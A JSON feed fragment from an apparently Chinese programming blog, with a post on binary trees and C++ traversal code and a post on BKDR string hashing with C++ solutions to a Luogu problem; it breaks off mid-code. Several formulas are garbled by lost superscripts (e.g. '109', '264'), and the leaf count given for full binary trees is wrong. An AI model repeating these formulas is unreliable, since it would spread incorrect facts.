            "content_html": "<h1 id=\"树\"><a class=\"anchor\" href=\"#树\">#</a> 树</h1>\n<h2 id=\"树的定义\"><a class=\"anchor\" href=\"#树的定义\">#</a> 树的定义</h2>\n<p>树是由一个集合以及在该集合上定义的一种关系构成的，集合中的元素称为树的结点，所定义的关系称为父子关系。父子关系在树的结点之间建立了一个层次结构，在这种层次结构中有一个结点具有特殊的地位，这个结点称为该树的根结点。</p>\n<p>数据结构中有很多树的结构，其中包括二叉树、二叉搜索树、2-3 树、红黑树等等，本文着重介绍二叉树。</p>\n<h2 id=\"树的基本术语\"><a class=\"anchor\" href=\"#树的基本术语\">#</a> 树的基本术语</h2>\n<ul>\n<li>节点的度：一个节点含有的子树的个数称为该节点的度；</li>\n<li>叶节点或终端节点：度为 0 的节点称为叶节点；</li>\n<li>非终端节点或分支节点：度不为 0 的节点；</li>\n<li>双亲节点或父节点：若一个节点含有子节点，则这个节点称为其子节点的父节点；</li>\n<li>孩子节点或子节点：一个节点含有的子树的根节点称为该节点的子节点；</li>\n<li>兄弟节点：具有相同父节点的节点互称为兄弟节点；</li>\n<li>树的度：一棵树中，最大的节点的度称为树的度；</li>\n<li>节点的层次：从根开始定义起，根为第 1 层，根的子节点为第 2 层，以此类推；</li>\n<li>树的高度或深度：树中节点的最大层次；</li>\n<li>堂兄弟节点：双亲在同一层的节点互为堂兄弟；</li>\n<li>节点的祖先：从根到该节点所经分支上的所有节点；</li>\n<li>子孙：以某节点为根的子树中任一节点都称为该节点的子孙。</li>\n<li>森林：由 m（m&gt;=0）棵互不相交的树的集合称为森林；</li>\n</ul>\n<h2 id=\"树的存储结构\"><a class=\"anchor\" href=\"#树的存储结构\">#</a> 树的存储结构</h2>\n<h3 id=\"双亲表示法\"><a class=\"anchor\" href=\"#双亲表示法\">#</a> 双亲表示法</h3>\n<p><img data-src=\"https://img-blog.csdn.net/20180611151650623?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<h3 id=\"孩子表示法\"><a class=\"anchor\" href=\"#孩子表示法\">#</a> 孩子表示法</h3>\n<p><img data-src=\"https://img-blog.csdn.net/20180611151704448?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<h2 id=\"二叉树\"><a class=\"anchor\" href=\"#二叉树\">#</a> 二叉树</h2>\n<p>二叉树是数据结构中一种重要的数据结构，也是树表家族最为基础的结构。</p>\n<p>二叉树的定义：二叉树的每个结点至多只有二棵子树 (不存在度大于 2 的结点)，二叉树的子树有左右之分，次序不能颠倒。</p>\n<h3 id=\"二叉树的性质\"><a class=\"anchor\" href=\"#二叉树的性质\">#</a> 二叉树的性质</h3>\n<ul>\n<li>二叉树的第 i ii 层至多有 2 i − 1 2^{i-1} 2 ^i−1 个结点；</li>\n<li>深度为 k 的二叉树至多有 2^k−1 个结点；</li>\n<li>对任何一棵二叉树 T，如果其终端结点数为 n0，度为 2 的结点数为，则 n0=n2+1</li>\n</ul>\n<h3 id=\"二叉树的实现\"><a class=\"anchor\" href=\"#二叉树的实现\">#</a> 二叉树的实现</h3>\n<h4 id=\"结构\"><a class=\"anchor\" href=\"#结构\">#</a> 结构</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">struct BiNode</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DataType data;</span><br><span class=\"line\">    BiNode&lt;DataType&gt; * lchild,*rchild;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">class BiTree</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    BiTree()&#123;root = Create(root);&#125;</span><br><span class=\"line\">    ~BiTree()&#123;Release(root);&#125;</span><br><span class=\"line\">    void PreOrder()&#123;PreOrder(root);&#125;\t//前序遍历</span><br><span class=\"line\">    void InOrder()&#123;InOrder(root);&#125;\t\t//中序遍历</span><br><span class=\"line\">    void PostOrder()&#123;PostOrder(root);&#125;\t//后序遍历</span><br><span class=\"line\">private:</span><br><span class=\"line\">    BiNode&lt;DataType&gt; * root;</span><br><span class=\"line\">    BiNode&lt;DataType&gt; * Create(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">    void Release(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">    void PreOrder(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">    void InOrder(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">    void PostOrder(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"建立二叉树\"><a class=\"anchor\" href=\"#建立二叉树\">#</a> 建立二叉树</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">BiNode&lt;DataType&gt; *BiTree&lt;DataType&gt;::Create(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DataType ch;</span><br><span class=\"line\">    cin&gt;&gt;ch;</span><br><span class=\"line\">    if(ch == &#x27;#&#x27;) bt = NULL;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        bt = new BiNode&lt;DataType&gt;;</span><br><span class=\"line\">        bt-&gt;data = ch;</span><br><span class=\"line\">        bt-&gt;lchild = Create(bt-&gt;lchild);</span><br><span class=\"line\">        bt-&gt;rchild = Create(bt-&gt;rchild);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return bt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"释放二叉树\"><a class=\"anchor\" href=\"#释放二叉树\">#</a> 释放二叉树</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">void BiTree&lt;DataType&gt;::Release(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(bt != NULL)&#123;</span><br><span class=\"line\">        Release(bt-&gt;lchild);</span><br><span class=\"line\">        Release(bt-&gt;rchild);</span><br><span class=\"line\">        delete bt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"前序遍历\"><a class=\"anchor\" href=\"#前序遍历\">#</a> 前序遍历</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">void BiTree&lt;DataType&gt;::PreOrder(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(bt == NULL) return;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        cout&lt;&lt;bt-&gt;data;</span><br><span class=\"line\">        PreOrder(bt-&gt;lchild);</span><br><span class=\"line\">        PreOrder(bt-&gt;rchild);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"中序遍历\"><a class=\"anchor\" href=\"#中序遍历\">#</a> 中序遍历</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">void BiTree&lt;DataType&gt;::InOrder(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(bt == NULL) return;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        InOrder(bt-&gt;lchild);</span><br><span class=\"line\">        cout&lt;&lt;bt-&gt;data;</span><br><span class=\"line\">        InOrder(bt-&gt;rchild);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"后序遍历\"><a class=\"anchor\" href=\"#后序遍历\">#</a> 后序遍历</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">void BiTree&lt;DataType&gt;::PostOrder(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(bt == NULL) return;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        PostOrder(bt-&gt;lchild);</span><br><span class=\"line\">        PostOrder(bt-&gt;rchild);</span><br><span class=\"line\">        cout&lt;&lt;bt-&gt;data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"满二叉树\"><a class=\"anchor\" href=\"#满二叉树\">#</a> 满二叉树</h3>\n<p>一棵深度为 k 且有 2^k-1 个结点的二叉树称为满二叉树。</p>\n<p><img data-src=\"https://img-blog.csdn.net/20180611151745758?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<h4 id=\"满二叉树的性质\"><a class=\"anchor\" href=\"#满二叉树的性质\">#</a> 满二叉树的性质：</h4>\n<ul>\n<li>一颗树深度为 h 最大层数为 k 深度与最大层数相同，k = h ;</li>\n<li>叶子数为 2h;</li>\n<li>第 k 层的结点数是 2^k−1;</li>\n<li>总结点数是：2^k−1 且总节点数一定是奇数。</li>\n</ul>\n<h3 id=\"完全二叉树\"><a class=\"anchor\" href=\"#完全二叉树\">#</a> 完全二叉树</h3>\n<p>深度为 k 的，有 n 个结点的二叉树，当且仅当其每一个结点都与深度为 k 的满二叉树中编号从 1 至 n 的结点一一对应时，称之为完全二叉树。</p>\n<p><img data-src=\"https://img-blog.csdn.net/20180611151734461?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<p>完全二叉树是效率很高的数据结构，堆是一种完全二叉树或者近似完全二叉树，所以效率极高，像十分常用的排序算法、Dijkstra 算法、Prim 算法等都要用堆才能优化，二叉排序树的效率也要借助平衡性来提高，而平衡性基于完全二叉树。</p>\n<h3 id=\"二叉排序树\"><a class=\"anchor\" href=\"#二叉排序树\">#</a> 二叉排序树</h3>\n<p>二叉查找树定义：又称为是二叉排序树（Binary Sort Tree）或二叉搜索树。</p>\n<p>二叉排序树或者是一棵空树，或者是具有下列性质的二叉树：</p>\n<ul>\n<li>若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li>\n<li>若它的右子树不空，则右子树上所有结点的值均大于或等于它的根结点的值；</li>\n<li>它的左、右子树也分别为二叉排序树。</li>\n</ul>\n<h3 id=\"平衡二叉树\"><a class=\"anchor\" href=\"#平衡二叉树\">#</a> 平衡二叉树</h3>\n<p>平衡二叉树（Balanced Binary Tree）又被称为 AVL 树。它或者是一棵空树，或者是具有下列性质的二叉树：它的左子树和右子树都是平衡二叉树，且左子树和右子树的深度之差的绝对值不超过 1。（注：平衡二叉树应该是一棵二叉排序树）</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E5%AD%97%E7%AC%A6%E4%B8%B2hash/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E5%AD%97%E7%AC%A6%E4%B8%B2hash/",
            "title": "CPP字符串hash",
            "date_published": "2023-01-13T19:09:06.000Z",
            "content_html": "<h1 id=\"hash\"><a class=\"anchor\" href=\"#hash\">#</a> Hash</h1>\n<p>Hash 就是一个像函数一样的东西，你放进去一个值，它给你输出来一个值。输出的值就是 Hash 值。一般 Hash 值会比原来的值更好储存 (更小) 或比较。</p>\n<p>那字符串 Hash 就非常好理解了。就是把字符串转换成一个整数的函数。而且要尽量做到使字符串对应唯一的 Hash 值。</p>\n<p>字符串 Hash 的种类还是有很多种的，不过在信息学竞赛中只会用到一种名为 “BKDR Hash” 的字符串 Hash 算法。</p>\n<p>它的主要思路是选取恰当的进制，可以把字符串中的字符看成一个大数字中的每一位数字，不过比较字符串和比较大数字的复杂度并没有什么区别 (高精数的比较也是 O (n)</p>\n<p>那么我们选择什么进制比较好？</p>\n<p>首先不要把任意字符对应到数字 0，比如假如把 a 对应到数字 0，那么将不能只从 Hash 结果上区分 ab 和 b（虽然可以额外判断字符串长度，但不把任意字符对应到数字 0 更加省事且没有任何副作用），一般而言，把 a-z 对应到数字 1-26 比较合适。</p>\n<p>关于进制的选择实际上非常自由，大于所有字符对应的数字的最大值，不要含有模数的质因子 (那还模什么)，比如一个字符集是 a 到 z 的题目，选择 27、233、19260817 都是可以的。</p>\n<p>模数的选择（尽量还是要选择质数）：</p>\n<p>绝大多数情况下，不要选择一个 109</p>\n<p>最稳妥的办法是选择两个 109 如果能背过或在考场上找出一个 1018 偷懒的写法就是直接使用 unsigned long long，不手动进行取模，它溢出时会自动对 264</p>\n<h2 id=\"用luogu-p3370为例\"><a class=\"anchor\" href=\"#用luogu-p3370为例\">#</a> 用 luogu P3370 为例。</h2>\n<p>这是自然溢出 hash (100)<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">ull a[10010];</span><br><span class=\"line\">char s[10010];</span><br><span class=\"line\">int n,ans=1;</span><br><span class=\"line\">ull hashs(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=ans*base+(ull)s[i];</span><br><span class=\"line\">    return ans&amp;0x7fffffff;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">    for (int i=1;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s&quot;,s);</span><br><span class=\"line\">        a[i]=hashs(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(a+1,a+n+1);</span><br><span class=\"line\">    for (int i=2;i&lt;=n;i++)</span><br><span class=\"line\">        if (a[i]!=a[i-1])</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这是单模数 hash (80)<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">ull a[10010];</span><br><span class=\"line\">char s[10010];</span><br><span class=\"line\">int n,ans=1;</span><br><span class=\"line\">ull mod=19260817;</span><br><span class=\"line\">ull hashs(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=(ans*base+(ull)s[i])%mod;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">    for (int i=1;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s&quot;,s);</span><br><span class=\"line\">        a[i]=hashs(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(a+1,a+n+1);</span><br><span class=\"line\">    for (int i=2;i&lt;=n;i++)</span><br><span class=\"line\">        if (a[i]!=a[i-1])</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这是双 hash (100)<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">struct data</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ull x,y;</span><br><span class=\"line\">&#125;a[10010];</span><br><span class=\"line\">char s[10010];</span><br><span class=\"line\">int n,ans=1;</span><br><span class=\"line\">ull mod1=19260817;</span><br><span class=\"line\">ull mod2=19660813;</span><br><span class=\"line\">ull hash1(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=(ans*base+(ull)s[i])%mod1;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ull hash2(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=(ans*base+(ull)s[i])%mod2;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bool comp(data a,data b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return a.x&lt;b.x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">    for (int i=1;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s&quot;,s);</span><br><span class=\"line\">        a[i].x=hash1(s);</span><br><span class=\"line\">        a[i].y=hash2(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(a+1,a+n+1,comp);</span><br><span class=\"line\">    for (int i=2;i&lt;=n;i++)</span><br><span class=\"line\">        if (a[i].x!=a[i-1].x || a[i-1].y!=a[i].y)</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这是只用一个 10^18 质数的 hash (100)<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">ull a[10010];</span><br><span class=\"line\">char s[10010];</span><br><span class=\"line\">int n,ans=1;</span><br><span class=\"line\">ull mod=212370440130137957ll;</span><br><span class=\"line\">ull hashs(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=(ans*base+(ull)s[i])%mod;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">    for (int i=1;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s&quot;,s);</span><br><span class=\"line\">        a[i]=hashs(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(a+1,a+n+1);</span><br><span class=\"line\">    for (int i=2;i&lt;=n;i++)</span><br><span class=\"line\">        if (a[i]!=a[i-1])</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"hash还有一方面就是它可以处理子串信息\"><a class=\"anchor\" href=\"#hash还有一方面就是它可以处理子串信息\">#</a> Hash 还有一方面，就是它可以处理子串信息</h2>\n<p>cogs1570</p>\n<p>【题目描述】</p>\n<p>法国作家乔治・佩雷克 (Georges Perec，1936-1982) 曾经写过一本书，《敏感字母》（La disparition），全篇没有一个字母‘e’。他是乌力波小组（Oulipo Group）的一员。下面是他书中的一段话：</p>\n<p>Tout avait Pair normal, mais tout s’affirmait faux. Tout avait Fair normal, d’abord, puis surgissait l’inhumain, l’affolant. Il aurait voulu savoir où s’articulait l’association qui l’unissait au roman : stir son tapis, assaillant à tout instant son imagination, l’intuition d’un tabou, la vision d’un mal obscur, d’un quoi vacant, d’un non-dit : la vision, l’avision d’un oubli commandant tout, où s’abolissait la raison : tout avait l’air normal mais…</p>\n<p>佩雷克很可能在下面的比赛中得到高分（当然，也有可能是低分）。在这个比赛中，人们被要求针对一个主题写出甚至是意味深长的文章，并且让一个给定的 “单词” 出现次数尽量少。我们的任务是给评委会编写一个程序来数单词出现了几次，用以得出参赛者最终的排名。参赛者经常会写一长串废话，例如 500000 个连续的‘T’。并且他们不用空格。</p>\n<p>因此我们想要尽快找到一个单词出现的频数，即一个给定的字符串在文章中出现了几次。更加正式地，给出字母表 {'A','B','C',...,'Z'} 和两个仅有字母表中字母组成的有限字符串：单词 W 和文章 T，找到 W 在 T 中出现的次数。这里 “出现” 意味着 W 中所有的连续字符都必须对应 T 中的连续字符。T 中出现的两个 W 可能会部分重叠。</p>\n<p>【输入格式】</p>\n<p>输入包含多组数据。</p>\n<p>输入文件的第一行有一个整数，代表数据组数。接下来是这些数据，以如下格式给出：</p>\n<p>第一行是单词 W，一个由 {'A','B','C',...,'Z'} 中字母组成的字符串，保证 1&lt;=|W|&lt;=10000（|W | 代表字符串 W 的长度）</p>\n<p>第二行是文章 T，一个由 {'A','B','C',...,'Z'} 中字母组成的字符串，保证 | W|&lt;=|T|&lt;=1000000。</p>\n<p>【输出格式】</p>\n<p>对每组数据输出一行一个整数，即 W 在 T 中出现的次数。</p>\n<p>【样例输入】</p>\n<p>3<br>\nBAPC<br>\nBAPC<br>\nAZA<br>\nAZAZAZA<br>\nVERDI<br>\nAVERDXIVYERDIAN</p>\n<p>【样例输出】</p>\n<p>1<br>\n3<br>\n0</p>\n<p>代码<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 